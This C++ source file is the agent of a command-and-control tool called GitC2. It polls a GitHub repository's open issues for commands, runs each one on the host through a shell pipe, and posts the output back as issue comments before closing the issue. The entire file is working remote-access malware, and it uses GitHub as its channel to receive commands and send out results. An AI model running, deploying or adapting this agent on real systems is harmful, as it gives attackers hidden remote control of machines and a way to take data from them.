#include <iostream>
#include <string>
#include <array>
#include <memory>
#include <thread>
#include <chrono>
#include <regex>
#include "settings.h"
#include "crypto.h"

using namespace std;

string exec(const string& cmd) {
    array<char, 128> buf;
    string result;
    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
    if (!pipe) return "Execution failed";
    while (fgets(buf.data(), buf.size(), pipe.get()) != nullptr) {
        result += buf.data();
    }
    return result;
}

int main() {
    string base_url = "https://api.github.com/repos/" + REPO_OWNER + "/" + REPO_NAME + "/issues";

    cout << "[!] GitC2: github.com/N3agu/GitC2\n";
    cout << "[*] Target URL: " << base_url << "\n";
    cout << "[*] Encrypted Communication: " << (ENCRYPT_COMMUNICATION ? "ENABLED" : "DISABLED") << "\n\n";

    while (true) {
        cout << "[*] Polling for open issues...\n";
        string fetch_cmd = "curl -s -H \"Authorization: token " + GITHUB_TOKEN + "\" \"" + base_url + "?state=open\"";
        string response = exec(fetch_cmd);

        if (response.find("\"number\"") != string::npos) {
            cout << "[+] Found open issue(s). Parsing JSON...\n";

            smatch match;
            regex number_regex("\"number\":\\s*(\\d+)");
            regex body_regex("\"body\":\\s*\"([^\"]+)\"");

            if (regex_search(response, match, number_regex)) {
                string issue_num = match[1].str();
                cout << "[+] Extracted Issue ID: #" << issue_num << "\n";

                if (regex_search(response, match, body_regex)) {
                    string task_cmd = match[1].str();

                    if (ENCRYPT_COMMUNICATION) {
                        task_cmd = decode_payload(task_cmd, GITHUB_TOKEN);
                    }

                    cout << "[+] Extracted Command: [" << task_cmd << "]\n";

                    if (task_cmd == "exit" || task_cmd == "quit") {
                        cout << "[!] Exit command received. Shutting down.\n";
                        break;
                    }

                    cout << "[*] Executing command...\n";
                    string output = exec(task_cmd);

                    if (ENCRYPT_COMMUNICATION) {
                        output = encode_payload(output, GITHUB_TOKEN);
                    }

                    string clean_output = regex_replace(output, regex("\\\\"), "\\\\\\\\");
                    clean_output = regex_replace(clean_output, regex("\""), "\\\"");
                    clean_output = regex_replace(clean_output, regex("\n"), "\\n");
                    clean_output = regex_replace(clean_output, regex("\r"), "");

                    string post_cmd = "curl -s -X POST -H \"Accept: application/vnd.github.v3+json\" -H \"Authorization: token " + GITHUB_TOKEN + "\" -d \"{\\\"body\\\":\\\"" + clean_output + "\\\"}\" \"" + base_url + "/" + issue_num + "/comments\"";
                    cout << "[*] Sending POST request to append comment...\n";
                    exec(post_cmd);

                    string close_cmd = "curl -s -X PATCH -H \"Accept: application/vnd.github.v3+json\" -H \"Authorization: token " + GITHUB_TOKEN + "\" -d \"{\\\"state\\\":\\\"closed\\\"}\" \"" + base_url + "/" + issue_num + "\"";
                    cout << "[*] Sending PATCH request to close issue #" << issue_num << "...\n\n";
                    exec(close_cmd);
                }
                else {
                    cout << "[-] Failed to extract command body. The regex might have missed it.\n";
                }
            }
        }
        this_thread::sleep_for(chrono::seconds(5));
    }
    return 0;
}